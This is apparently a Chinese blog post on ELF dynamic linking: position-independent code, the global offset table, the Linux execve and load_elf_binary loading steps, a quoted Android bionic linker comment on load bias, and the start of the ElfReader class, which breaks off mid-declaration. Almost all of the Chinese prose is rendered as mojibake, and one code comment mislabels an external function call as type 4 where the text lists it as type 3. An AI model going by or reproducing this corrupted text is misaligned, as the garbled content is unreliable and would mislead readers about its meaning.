ä¸ºåŠ¨æ€é“¾æ¥çš„æƒ…å†µä¸‹ï¼Œè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„åˆ†å¸ƒä¼šæ¯”é™æ€é“¾æ¥æƒ…å†µä¸‹æ›´ä¸ºå¤æ‚ï¼Œè¿˜æœ‰ä¸€äº›å­˜å‚¨ç®¡ç†ã€å†…å­˜å…±äº«ã€è¿›ç¨‹çº¿ç¨‹ç­‰æœºåˆ¶åœ¨åŠ¨æ€é“¾æ¥ä¸‹ä¹Ÿä¼šæœ‰ä¸€äº›å¾®å¦™çš„å˜åŒ–ã€‚ ç›®å‰ï¼Œä¸»æµæ“ä½œç³»ç»Ÿéƒ½æ”¯æŒåŠ¨æ€é“¾æ¥ã€‚åœ¨ Linux ä¸­ï¼ŒELF åŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º åŠ¨æ€å…±äº«å¯¹è±¡ï¼ˆDSOï¼ŒDynamic Shared Objectsï¼‰ï¼Œä¸€èˆ¬ä»¥ .so ä¸ºåç¼€ï¼›åœ¨ Windows ä¸­ï¼ŒåŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º åŠ¨æ€é“¾æ¥åº“ï¼ˆDynamic Linking Libraryï¼‰ï¼Œä¸€èˆ¬ä»¥ .dll ä¸ºåç¼€ã€‚ åœ¨ Linux ä¸­ï¼Œå¸¸ç”¨çš„ C è¯­è¨€åº“çš„è¿è¡Œåº“ glibcï¼Œå…¶åŠ¨æ€é“¾æ¥å½¢å¼çš„ç‰ˆæœ¬ä¿ç•™åœ¨ /lib ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º libc.so ã€‚æ•´ä¸ªç³»ç»Ÿåªä¿ç•™ä¸€ä»½ C è¯­è¨€åŠ¨æ€é“¾æ¥æ–‡ä»¶ libc.so ï¼Œæ‰€æœ‰çš„ C è¯­è¨€ç¼–å†™çš„ã€åŠ¨æ€é“¾æ¥çš„ç¨‹åºéƒ½å¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨å®ƒã€‚å½“ç¨‹åºè¢«è£…è½½æ—¶ï¼Œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥å™¨ä¼šå°†ç¨‹åºæ‰€éœ€è¦çš„æ‰€æœ‰åŠ¨æ€é“¾æ¥åº“è£…è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå¹¶å°†ç¨‹åºä¸­æ‰€æœ‰æœªè§£æçš„ç¬¦å·ç»‘å®šåˆ°ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œå¹¶è¿›è¡Œé‡å®šä½ã€‚ # åŠ¨æ€é“¾æ¥ç¨‹åºè¿è¡Œæ—¶åœ°å€ç©ºé—´åˆ†å¸ƒ å¯¹äºé™æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶æ¥è¯´ï¼Œæ•´ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªæ–‡ä»¶è¦è¢«æ˜ å°„ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶ã€‚è€Œå¯¹äºåŠ¨æ€é“¾æ¥ï¼Œé™¤äº†å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜æœ‰å®ƒæ‰€ä¾èµ–çš„å…±äº«ç›®æ ‡æ–‡ä»¶ã€‚ å…³äºå…±äº«ç›®æ ‡æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„åœ°å€åˆ†é…ï¼Œä¸»è¦æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œåˆ†åˆ«æ˜¯ï¼š é™æ€å…±äº«åº“ï¼ˆStatic Shared Libraryï¼‰ï¼ˆåœ°å€å›ºå®šï¼‰ åŠ¨æ€å…±äº«åº“ï¼ˆDynamic Shared Libaryï¼‰ï¼ˆåœ°å€ä¸å›ºå®šï¼‰ # é™æ€å…±äº«åº“ é™æ€å…±äº«åº“çš„åšæ³•æ˜¯å°†ç¨‹åºçš„å„ä¸ªæ¨¡å—ç»Ÿä¸€äº¤ç»™æ“ä½œç³»ç»Ÿè¿›è¡Œç®¡ç†ï¼Œæ“ä½œç³»ç»Ÿåœ¨æŸä¸ªç‰¹å®šçš„åœ°å€åˆ’åˆ†å‡ºä¸€äº›åœ°å€å—ï¼Œä¸ºé‚£äº›å·²çŸ¥çš„æ¨¡å—é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´ã€‚å› ä¸ºè¿™ä¸ªåœ°å€å¯¹äºä¸åŒçš„åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œéƒ½æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºé™æ€ã€‚ ä½†æ˜¯é™æ€å…±äº«åº“çš„ç›®æ ‡åœ°å€ä¼šå¯¼è‡´åœ°å€å†²çªã€å‡çº§ç­‰é—®é¢˜ã€‚ # åŠ¨æ€å…±äº«åº“ é‡‡ç”¨åŠ¨æ€å…±äº«åº“çš„æ–¹å¼ï¼Œä¹Ÿç§°ä¸ºè£…è½½æ—¶é‡å®šä½ï¼ˆLoad Time Relocationï¼‰ã€‚å…¶åŸºæœ¬æ€è·¯æ˜¯ï¼šåœ¨é“¾æ¥æ—¶ï¼Œå¯¹æ‰€æœ‰ç»å¯¹åœ°å€çš„å¼•ç”¨éƒ½ä¸ä½œé‡å®šä½ï¼Œè€ŒæŠŠè¿™ä¸€æ­¥æ¨è¿Ÿåˆ°è£…è½½æ—¶å†å®Œæˆã€‚ä¸€æ—¦æ¨¡å—è£…è½½åœ°å€ç¡®å®šï¼Œå³ç›®æ ‡åœ°å€ç¡®å®šï¼Œé‚£ä¹ˆç³»ç»Ÿå°±å¯¹ç¨‹åºä¸­æ‰€æœ‰çš„ç»å¯¹åœ°å€å¼•ç”¨è¿›è¡Œé‡å®šä½ã€‚ ä½†æ˜¯è¿™ç§æ–¹å¼ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ã€‚æ¯”å¦‚ï¼ŒåŠ¨æ€é“¾æ¥æ¨¡å—è¢«è£…è½½æ˜ å°„è‡³è™šæ‹Ÿç©ºé—´åï¼ŒæŒ‡ä»¤éƒ¨åˆ†æ˜¯åœ¨å¤šä¸ªè¿›ç¨‹é—´å…±äº«çš„ï¼Œç”±äºè£…è½½æ—¶é‡å®šä½çš„æ–¹æ³•éœ€è¦ä¿®æ”¹æŒ‡ä»¤ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•åšåˆ°åŒä¸€ä»½æŒ‡ä»¤è¢«å¤šä¸ªè¿›ç¨‹å…±äº«ï¼Œå› ä¸ºæŒ‡ä»¤è¢«é‡å®šä½åå¯¹äºæ¯ä¸ªè¿›ç¨‹æ¥è¯´éƒ½æ˜¯ä¸åŒçš„ã€‚ è™½ç„¶ï¼ŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç æ˜¯å…±äº«çš„ï¼Œä½†æ˜¯å…¶ä¸­çš„å¯ä¿®æ”¹æ•°æ®éƒ¨åˆ†å¯¹äºä¸åŒè¿›ç¨‹æ¥è¯´æ˜¯ç”±å¤šä¸ªå‰¯æœ¬çš„ã€‚åŸºäºæ­¤ï¼Œä¸€ç§åä¸ºåœ°å€æ— å…³ä»£ç çš„æŠ€æœ¯è¢«æå‡ºä»¥å…‹æœè¿™ä¸ªé—®é¢˜ã€‚ # åœ°å€æ— å…³ä»£ç  è®¡ç®—æœºç§‘å­¦é¢†åŸŸçš„ä»»ä½•é—®é¢˜éƒ½å¯ä»¥é€šè¿‡å¢åŠ ä¸€ä¸ªé—´æ¥çš„ä¸­é—´å±‚æ¥è§£å†³ã€‚ åœ°å€æ— å…³ä»£ç ï¼ˆPICï¼ŒPosition-independent Codeï¼‰ æŠ€æœ¯å®Œç¾é˜é‡Šäº†ä¸Šé¢è¿™å¥åè¨€ï¼Œå…¶åŸºæœ¬åŸç†æ˜¯ï¼šæŠŠæŒ‡ä»¤ä¸­é‚£äº›éœ€è¦è¢«ä¿®æ”¹çš„éƒ¨åˆ†åˆ†ç¦»å‡ºæ¥ï¼Œè·Ÿæ•°æ®éƒ¨åˆ†æ”¾åœ¨ä¸€èµ·ï¼Œè¿™æ ·æŒ‡ä»¤éƒ¨åˆ†å°±å¯ä»¥ä¿æŒä¸å˜ï¼Œè€Œæ•°æ®éƒ¨åˆ†å¯ä»¥åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­æ‹¥æœ‰ä¸€ä¸ªå‰¯æœ¬ã€‚ å…±äº«å¯¹è±¡æ¨¡å—ä¸­çš„åœ°å€å¼•ç”¨æŒ‰ç…§æ˜¯å¦ä¸ºè·¨æ¨¡å—åˆ†ä¸ºä¸¤ç±»ï¼šæ¨¡å—å†…éƒ¨å¼•ç”¨ã€æ¨¡å—å¤–éƒ¨å¼•ç”¨ã€‚æŒ‰ç…§ä¸ç”¨çš„å¼•ç”¨æ–¹å¼åˆå¯åˆ†ä¸ºï¼šæŒ‡ä»¤å¼•ç”¨ã€æ•°æ®å¼•ç”¨ã€‚ä»¥å¦‚ä¸‹ä»£ç ä¸ºä¾‹ï¼Œå¯å¾—å‡ºå¦‚ä¸‹å››ç§ç±»å‹ï¼š ç±»å‹ 1ï¼šæ¨¡å—å†…éƒ¨çš„å‡½æ•°è°ƒç”¨ã€‚ ç±»å‹ 2ï¼šæ¨¡å—å†…éƒ¨çš„æ•°æ®è®¿é—®ï¼Œå¦‚æ¨¡å—ä¸­å®šä¹‰çš„å…¨å±€å˜é‡ã€é™æ€å˜é‡ã€‚ ç±»å‹ 3ï¼šæ¨¡å—å¤–éƒ¨çš„å‡½æ•°è°ƒç”¨ã€‚ ç±»å‹ 4ï¼šæ¨¡å—å¤–éƒ¨çš„æ•°æ®è®¿é—®ï¼Œå¦‚å…¶ä»–æ¨¡å—ä¸­å®šä¹‰çš„å…¨å±€å˜é‡ã€‚ static int a; extern int b; extern void ext(); void bar() &#123; a = 1; // ç±»å‹2ï¼šæ¨¡å—å†…éƒ¨æ•°æ®è®¿é—® b = 2; // ç±»å‹4ï¼šæ¨¡å—å¤–éƒ¨æ•°æ®è®¿é—® &#125; void foo() &#123; bar(); // ç±»å‹1ï¼šæ¨¡å—å†…éƒ¨å‡½æ•°è°ƒç”¨ ext(); // ç±»å‹4ï¼šæ¨¡å—å¤–éƒ¨å‡½æ•°è°ƒç”¨ &#125; # ç±»å‹ 1 æ¨¡å—å†…éƒ¨å‡½æ•°è°ƒç”¨ ç”±äºè¢«è°ƒç”¨çš„å‡½æ•°ä¸è°ƒç”¨è€…éƒ½å¤„äºåŒä¸€æ¨¡å—ï¼Œå®ƒä»¬ä¹‹é—´çš„ç›¸å¯¹ä½ç½®æ˜¯å›ºå®šçš„ã€‚å¯¹äºç°ä»£çš„ç³»ç»Ÿæ¥è¯´ï¼Œæ¨¡å—å†…éƒ¨çš„è°ƒç”¨éƒ½å¯ä»¥æ˜¯ç›¸å¯¹åœ°å€è°ƒç”¨ï¼Œæˆ–è€…æ˜¯åŸºäºå¯„å­˜å™¨çš„ç›¸å¯¹è°ƒç”¨ï¼Œæ‰€ä»¥å¯¹äºè¿™ç§æŒ‡ä»¤æ˜¯ä¸éœ€è¦é‡å®šä½çš„ã€‚ # ç±»å‹ 2 æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—® ä¸€ä¸ªæ¨¡å—å‰é¢ä¸€èˆ¬æ˜¯è‹¥å¹²ä¸ªé¡µçš„ä»£ç ï¼Œåé¢ç´§è·Ÿç€è‹¥å¹²ä¸ªé¡µçš„æ•°æ®ï¼Œè¿™äº›é¡µä¹‹é—´çš„ç›¸å¯¹ä½ç½®æ˜¯å›ºå®šçš„ï¼Œå³ä»»ä½•ä¸€æ¡æŒ‡ä»¤ä¸å®ƒéœ€è¦è®¿é—®çš„æ¨¡å—å†…éƒ¨æ•°æ®ä¹‹é—´çš„ç›¸å¯¹ä½ç½®æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åªéœ€è¦ç›¸å¯¹äºå½“å‰æŒ‡ä»¤åŠ ä¸Šå›ºå®šçš„åç§»é‡å°±å¯ä»¥è®¿é—®æ¨¡å—å†…éƒ¨æ•°æ®äº†ã€‚ # ç±»å‹ 3 æ¨¡å—é—´æ•°æ®è®¿é—® æ¨¡å—é—´çš„æ•°æ®è®¿é—®æ¯”æ¨¡å—å†…éƒ¨ç¨å¾®éº»çƒ¦ä¸€äº›ï¼Œå› ä¸ºæ¨¡å—é—´çš„æ•°æ®è®¿é—®ç›®æ ‡åœ°å€è¦ç­‰åˆ°è£…è½½æ—¶æ‰å†³å®šã€‚æ­¤æ—¶ï¼ŒåŠ¨æ€é“¾æ¥éœ€è¦ä½¿ç”¨ä»£ç æ— å…³åœ°å€æŠ€æœ¯ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯æŠŠåœ°å€ç›¸å…³çš„éƒ¨åˆ†æ”¾åˆ°æ•°æ®æ®µã€‚ELF çš„å®ç°æ–¹æ³•æ˜¯ï¼šåœ¨æ•°æ®æ®µä¸­å»ºç«‹ä¸€ä¸ªæŒ‡å‘è¿™äº›å˜é‡çš„æŒ‡é’ˆæ•°ç»„ï¼Œä¹Ÿç§°ä¸ºå…¨å±€åç§»è¡¨ï¼ˆGlobal Offset Tableï¼ŒGOTï¼‰ï¼Œå½“ä»£ç éœ€è¦å¼•ç”¨è¯¥å…¨å±€å˜é‡æ—¶ï¼Œå¯ä»¥é€šè¿‡ GOT ä¸­ç›¸å¯¹åº”çš„é¡¹é—´æ¥å¼•ç”¨ã€‚è¿‡ç¨‹ç¤ºæ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š å½“æŒ‡ä»¤ä¸­éœ€è¦è®¿é—®å˜é‡ b æ—¶ï¼Œç¨‹åºä¼šå…ˆæ‰¾åˆ° GOTï¼Œç„¶åæ ¹æ® GOT ä¸­å˜é‡æ‰€å¯¹åº”çš„é¡¹æ‰¾åˆ°å˜é‡çš„ç›®æ ‡åœ°å€ã€‚æ¯ä¸ªå˜é‡éƒ½å¯¹åº”ä¸€ä¸ª 4 å­—èŠ‚çš„åœ°å€ï¼Œé“¾æ¥å™¨åœ¨è£…è½½æ¨¡å—æ—¶ä¼šæŸ¥æ‰¾æ¯ä¸ªå˜é‡æ‰€åœ¨çš„åœ°å€ï¼Œç„¶åå¡«å…… GOT ä¸­çš„å„ä¸ªé¡¹ï¼Œä»¥ç¡®ä¿æ¯ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€æ­£ç¡®ã€‚ç”±äº GOT æœ¬èº«æ˜¯æ”¾åœ¨æ•°æ®æ®µçš„ï¼Œæ‰€ä»¥å®ƒå¯ä»¥åœ¨æ¨¡å—è£…è½½æ—¶è¢«ä¿®æ”¹ï¼Œå¹¶ä¸”æ¯ä¸ªè¿›ç¨‹éƒ½å¯ä»¥æœ‰ç‹¬ç«‹çš„å‰¯æœ¬ï¼Œç›¸äº’ä¸å—å½±å“ã€‚ # ç±»å‹ 4 æ¨¡å—é—´å‡½æ•°è°ƒç”¨ å¯¹äºæ¨¡å—é—´å‡½æ•°è°ƒç”¨ï¼ŒåŒæ ·å¯ä»¥é‡‡ç”¨ç±»å‹ 3 çš„æ–¹æ³•æ¥è§£å†³ã€‚ä¸ä¸Šé¢çš„ç±»å‹æœ‰æ‰€ä¸åŒçš„æ˜¯ï¼ŒGOT ä¸­å“åº”çš„é¡¹ä¿å­˜çš„æ˜¯ç›®æ ‡å‡½æ•°çš„åœ°å€ï¼Œå½“æ¨¡å—éœ€è¦è°ƒç”¨ç›®æ ‡å‡½æ•°æ—¶ï¼Œå¯ä»¥é€šè¿‡ GOT ä¸­çš„é¡¹è¿›è¡Œé—´æ¥è·³è½¬ã€‚ # ELF çš„è£…è½½è¿‡ç¨‹ æ­¤å¤„çš„å†…å®¹æ¥æºäºè®¡ç®—æœºé‚£äº›äº‹ (6)â€”â€” å¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½ä¸è¿è¡Œï¼Œä»…ä½œå­¦ä¹ è®°å½•å’Œå¤‡ä»½ç”¨ å½“æˆ‘ä»¬åœ¨ Linux çš„ bash ä¸­è¾“å…¥å‘½ä»¤æ‰§è¡ŒæŸä¸ª ELF å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ $ ./hello.out é‚£ä¹ˆï¼ŒLinux ç³»ç»Ÿæ˜¯å¦‚ä½•è£…è½½è¯¥ ELF æ–‡ä»¶å¹¶æ‰§è¡Œçš„å‘¢ï¼Ÿè¿™ä¸ªè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹è¿™äº›æ­¥éª¤ï¼š åˆ›å»ºæ–°è¿›ç¨‹ æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶ç±»å‹ æœç´¢åŒ¹é…è£…è½½å¤„ç†è¿‡ç¨‹ è£…è½½æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ # åˆ›å»ºæ–°è¿›ç¨‹ é¦–å…ˆåœ¨ç”¨æˆ·å±‚é¢ï¼Œbash è¿›ç¨‹ä¼šè°ƒç”¨ fork() ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚å…¶æ¬¡ï¼Œæ–°çš„è¿›ç¨‹é€šè¿‡è°ƒç”¨ execve() ç³»ç»Ÿè°ƒç”¨æ¥æ‰§è¡ŒæŒ‡å®šçš„ ELF æ–‡ä»¶ã€‚åŸå…ˆçš„ bash è¿›ç¨‹ç»§ç»­è¿”å›å¹¶ç­‰å¾…åˆšæ‰å¯åŠ¨çš„æ–°è¿›ç¨‹ç»“æŸï¼Œä¹‹åç»§ç»­ç­‰å¾…ç”¨æˆ·è¾“å…¥å‘½ä»¤ã€‚ execve() ç³»ç»Ÿè°ƒç”¨è¢«å®šä¹‰åœ¨ unistd.h ï¼Œå…¶åŸå‹å¦‚ä¸‹æ‰€ç¤ºã€‚å…¶ä¸­çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«å¯¹åº”è¢«æ‰§è¡Œç¨‹åºçš„ ç¨‹åºæ–‡ä»¶åã€æ‰§è¡Œå‚æ•°ã€ç¯å¢ƒå˜é‡ã€‚ int execve(const char *filename, char *const argv[], char *const envp[]); # æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶ç±»å‹ å½“è¿›å…¥ execve() ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼ŒLinux å†…æ ¸å°±å¼€å§‹è¿›è¡ŒçœŸæ­£çš„è£…è½½å·¥ä½œã€‚åœ¨å†…æ ¸ä¸­ï¼Œ execve() ç³»ç»Ÿè°ƒç”¨ç›¸åº”çš„å…¥å£æ˜¯ sys_execve() ã€‚ sys_execve() è¿›è¡Œä¸€äº›å‚æ•°çš„æ£€æŸ¥å¤åˆ¶ä¹‹åï¼Œè°ƒç”¨ do_execve() ã€‚ do_execve() ä¼šé¦–å…ˆæŸ¥æ‰¾è¢«æ‰§è¡Œçš„æ–‡ä»¶ï¼Œå¦‚æœæ‰¾åˆ°æ–‡ä»¶ï¼Œåˆ™è¯»å–æ–‡ä»¶çš„å‰ 128 ä¸ªå­—èŠ‚ã€‚ ä¸ºä»€ä¹ˆè¦å…ˆè¯»å–æ–‡ä»¶çš„å‰ 128 ä¸ªå­—èŠ‚ï¼Ÿè¿™æ˜¯å› ä¸º Linux æ”¯æŒçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸æ­¢ ELF ä¸€ç§ï¼Œè¿˜åŒ…æ‹¬ a.outã€Java ç¨‹åºã€ä»¥ #! å¼€å¤´çš„è„šæœ¬ç¨‹åºã€‚ do_execve() é€šè¿‡è¯»å–å‰ 128 ä¸ªå­—èŠ‚æ¥åˆ¤æ–­æ–‡ä»¶çš„æ ¼å¼ã€‚æ¯ç§å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼çš„å¼€å¤´å‡ ä¸ªå­—èŠ‚éƒ½æ˜¯å¾ˆç‰¹æ®Šçš„ï¼Œå°¤å…¶æ˜¯å‰ 4 ä¸ªå­—èŠ‚ï¼Œè¢«ç§°ä¸º é­”æ•°ï¼ˆMagic Numberï¼‰ã€‚æ¯”å¦‚ï¼šELF çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼çš„å¤´ 4 ä¸ªå­—èŠ‚ä¸º 0x7F ã€ e ã€ l ã€ f ï¼›Java çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼çš„å¤´ 4 ä¸ªå­—èŠ‚ä¸º c ã€ a ã€ f ã€ e ï¼›å¦‚æœæ˜¯è§£é‡Šå‹è¯­è¨€çš„è„šæœ¬ï¼Œåˆ™ç¬¬ä¸€è¡Œé€šå¸¸æ˜¯ #!/bin/sh æˆ– #!/user/bin/python ï¼Œå…¶ä¸­ # å’Œ ! æ„æˆäº†é­”æ•°ï¼Œç³»ç»Ÿä¸€æ—¦åˆ¤æ–­åˆ°è¿™ä¸¤ä¸ªå­—èŠ‚ï¼Œå°±å¯¹åé¢çš„å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œä»¥ç¡®å®šå…·ä½“çš„è§£é‡Šç¨‹åºçš„è·¯å¾„ã€‚ # æœç´¢åŒ¹é…è£…è½½å¤„ç†è¿‡ç¨‹ å½“ do_execve() è¯»å–äº† 128 ä¸ªå­—èŠ‚çš„æ–‡ä»¶å¤´éƒ¨ä¹‹åï¼Œè°ƒç”¨ search_binary_handle() å»æœç´¢å’ŒåŒ¹é…åˆé€‚çš„å¯æ‰§è¡Œæ–‡ä»¶è£…è½½å¤„ç†è¿‡ç¨‹ã€‚Linux ä¸­æ‰€æœ‰è¢«æ”¯æŒçš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼éƒ½æœ‰ç›¸åº”çš„è£…è½½å¤„ç†è¿‡ç¨‹ï¼Œ search_binary_handler() ä¼šé€šè¿‡åˆ¤æ–­å¤´éƒ¨çš„é­”æœ¯ç¡®å®šæ–‡ä»¶çš„æ ¼å¼ï¼Œå¹¶ä¸”è°ƒç”¨ç›¸åº”çš„è£…è½½å¤„ç†è¿‡ç¨‹ã€‚å¸¸è§çš„å¯æ‰§è¡Œç¨‹åºåŠå…¶è£…è½½å¤„ç†è¿‡ç¨‹çš„å¯¹åº”å…³ç³»å¦‚ä¸‹æ‰€ç¤º. ELF å¯æ‰§è¡Œæ–‡ä»¶ï¼š load_elf_binary() a.out å¯æ‰§è¡Œæ–‡ä»¶ï¼š load_aout_binary() å¯æ‰§è¡Œè„šæœ¬ç¨‹åºï¼š load_script() # è£…è½½æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ ä»¥ ELF çš„è£…è½½å¤„ç†è¿‡ç¨‹ load_elf_binary() ä¸ºä¾‹ï¼Œå…¶æ‰€åŒ…å«çš„æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ“ä½œç³»ç»Ÿè¯»å–å¯æ‰§è¡Œæ–‡ä»¶ ELF çš„ Header ï¼Œæ£€æŸ¥æ–‡ä»¶çš„æœ‰æ•ˆæ€§ã€‚ æ“ä½œç³»ç»Ÿè¯»å–å¯æ‰§è¡Œæ–‡ä»¶ ELF çš„ Program Header Table ä¸­è¯»å–æ¯ä¸ª Segment çš„è™šæ‹Ÿåœ°å€ã€æ–‡ä»¶åœ°å€ã€å±æ€§ç­‰ã€‚ æ“ä½œç³»ç»Ÿæ ¹æ® Program Header Table å°†å¯æ‰§è¡Œæ–‡ä»¶ ELF æ˜ å°„è‡³å†…å­˜ã€‚ å¦‚æœæ˜¯é™æ€é“¾æ¥çš„æƒ…å†µï¼Œåˆ™ç›´æ¥è·³è½¬è‡³ç¬¬ 7 æ­¥ï¼›å¦‚æœæ˜¯åŠ¨æ€é“¾æ¥çš„æƒ…å†µï¼Œæ“ä½œç³»ç»Ÿå°†æŸ¥æ‰¾ .interp èŠ‚ï¼Œæ‰¾åˆ° åŠ¨æ€é“¾æ¥å™¨ï¼ˆDynamic Linkerï¼‰ çš„ä½ç½®ï¼Œå¹¶å¯åŠ¨åŠ¨æ€é“¾æ¥å™¨ã€‚åœ¨ Linux ä¸‹ï¼ŒåŠ¨æ€é“¾æ¥å™¨ ld.so æ˜¯ä¸€ä¸ªå…±äº«å¯¹è±¡ï¼Œæ“ä½œç³»ç»ŸåŒæ ·é€šè¿‡æ˜ å°„çš„æ–¹å¼å°†å®ƒåŠ è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚æ“ä½œç³»ç»Ÿåœ¨åŠ è½½å®Œåï¼Œå°†æ§åˆ¶æƒäº¤ç»™åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£ã€‚ åŠ¨æ€é“¾æ¥å™¨è·å¾—æ§åˆ¶æƒåï¼Œå¼€å§‹æ‰§è¡Œä¸€ç³»åˆ—åˆå§‹åŒ–æ“ä½œã€‚ åŠ¨æ€é“¾æ¥å™¨æ ¹æ®å½“å‰çš„ç¯å¢ƒå‚æ•°ï¼Œå¯¹å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡ŒåŠ¨æ€é“¾æ¥å·¥ä½œã€‚ æ§åˆ¶æƒè¢«è½¬äº¤åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„å…¥å£åœ°å€ï¼Œç¨‹åºå¼€å§‹æ­£å¼æ‰§è¡Œã€‚ # TECHNICAL NOTE ON ELF LOADING åœ¨ android-platform\\bionic\\linker\\linker_phdr.cpp ä¸­å¼€å¤´çš„è¿™å¤„æ³¨é‡Šä¹Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿç†è§£ ELF çš„åŠ è½½è¿‡ç¨‹ TECHNICAL NOTE ON ELF LOADING. An ELF fileâ€™s program header table contains one or more PT_LOAD segments, which corresponds to portions of the file that need to be mapped into the processâ€™ address space. Each loadable segment has the following important properties: p_offset -&gt; segment file offset p_filesz -&gt; segment file size p_memsz -&gt; segment memory size (always &gt;= p_filesz) p_vaddr -&gt; segment's virtual address p_flags -&gt; segment flags (e.g. readable, writable, executable) p_align -&gt; segment's in-memory and in-file alignment We will ignore the p_paddr field of ElfW(Phdr) for now. The loadable segments can be seen as a list of [p_vaddr â€¦ p_vaddr+p_memsz) ranges of virtual addresses. A few rules apply: the virtual address ranges should not overlap. if a segmentâ€™s p_filesz is smaller than its p_memsz, the extra bytes between them should always be initialized to 0. ranges do not necessarily start or end at page boundaries. Two distinct segments can have their start and end on the same page. In this case, the page inherits the mapping flags of the latter segment. Finally, the real load addrs of each segment is not p_vaddr. Instead the loader decides where to load the first segment, then will load all others relative to the first one to respect the initial range layout. For example, consider the following list: [ offset:0, filesz:0x4000, memsz:0x4000, vaddr:0x30000 ], [ offset:0x4000, filesz:0x2000, memsz:0x8000, vaddr:0x40000 ], This corresponds to two segments that cover these virtual address ranges: 0x30000...0x34000 0x40000...0x48000 If the loader decides to load the first segment at address 0xa0000000 then the segmentsâ€™ load address ranges will be: 0xa0030000...0xa0034000 0xa0040000...0xa0048000 In other words, all segments must be loaded at an address that has the same constant offset from their p_vaddr value. This offset is computed as the difference between the first segmentâ€™s load address, and its p_vaddr value. However, in practice, segments do not start at page boundaries. Since we can only memory-map at page boundaries, this means that the bias is computed as: load_bias = phdr0_load_address - PAGE_START(phdr0-&gt;p_vaddr) (NOTE: The value must be used as a 32-bit unsigned integer, to deal with possible wrap around UINT32_MAX for possible large p_vaddr values). And that the phdr0_load_address must start at a page boundary, with the segmentâ€™s real content starting at: phdr0_load_address + PAGE_OFFSET(phdr0-&gt;p_vaddr) Note that ELF requires the following condition to make the mmap()-ing work: PAGE_OFFSET(phdr0-&gt;p_vaddr) == PAGE_OFFSET(phdr0-&gt;p_offset) The load_bias must be added to any p_vaddr value read from the ELF file to determine the corresponding memory address. # ElfReader ç±» //android-platform\\bionic\\linker\\linker_phdr.hclass ElfReader &#123; public: ElfReader(); bool Read(const char* name, int fd, off64_t file_offset, off64_t file_size); bool Load(address_space_params* address_space); const char* name() const &#123; return name_.c_str(); &#125; size_t phdr_count() const &#123; return phdr_num_; &#125; ElfW(Addr) load_start() const &#123; return reinterpret_cast&lt;ElfW(Addr)>(load_start_); &#125; size_t load_size() const &#123; return load_size_; &#125; ElfW(Addr) gap_start() const &#123; return reinterpret_cast&lt;ElfW(Addr)>(gap_start_); &#125; size_t gap_size() const &#123; return gap_size_; &#125; ElfW(Addr) load_bias() const &#123; return load_bias_; &#125; const ElfW(Phdr)* loaded_phdr() const &#123; return loaded_phdr_; &#125; const ElfW(Dyn)* dynamic() const &#123; return dynamic_; &#125; const char* get_string(ElfW(Word) index) const; bool is_mapped_by_caller() const &#123; return mapped_by_caller_; &#125; ElfW(Addr) entry_point() const &#123; return header_.e_entry + load_bias_; &#125; private: bool ReadElfHeader(); bool VerifyElfHeader(); bool ReadProgramHeaders(); bool ReadSectionHeaders(); bool ReadDynamicSection(); bool ReserveAddressSpace(address_space_params* address_space); bool LoadSegments(); bool FindPhdr(); bool FindGnuPropertySection(); bool CheckPhdr(ElfW(Addr)); bool CheckFileRange(ElfW(Addr) offset, size_t size, size_t alignment); bool did_read_; bool did_load_; std::string name_; int fd_; off64_t file_offset_; off64_t file_size_; ElfW(Ehdr) header_; size_t phdr_num_; MappedFileFragment phdr_fragment_; const ElfW(Phdr)* phdr_table_; MappedFileFragment shdr_fragment_; const ElfW(Shdr)* shdr_table_; size_t shdr_num_; MappedFileFragment dynamic_fragment_; const ElfW(Dyn)* dynamic_; MappedFileFragment strtab_fragment_; const char* strtab_; size_t 